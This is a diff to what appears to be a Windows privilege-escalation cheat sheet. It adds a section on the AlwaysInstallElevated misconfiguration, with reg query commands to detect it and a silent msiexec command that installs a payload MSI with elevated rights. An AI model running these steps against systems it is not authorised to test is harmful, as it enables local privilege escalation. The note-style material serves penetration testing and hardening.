@@ -1,5 +1,6 @@
 [Unquoted Service Paths](#unquoted-service-paths)  
 [Missing Windows Patches](#missing-windows-patches)  
+[AlwaysElevate](#alwayselevate)
 
 
 
@@ -26,5 +27,17 @@ If C:\Program.exe is not found, then C:\Program Files\A.exe would be executed. I
 wmic qfe list
 ```
 
-## Enabled Always Elevate in the Registry
+## AlwaysElevate
+
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+A value of 0x1 in both of these registry keys indicates a regular user is able to execute msi files with automatic elevated privileges.  
+
+Generating a payload packaged in an msi file would be executed with elevated privileges on the target.
+
+```
+c:\msiexec /quiet /qn /i <payload.msi>
+```
 
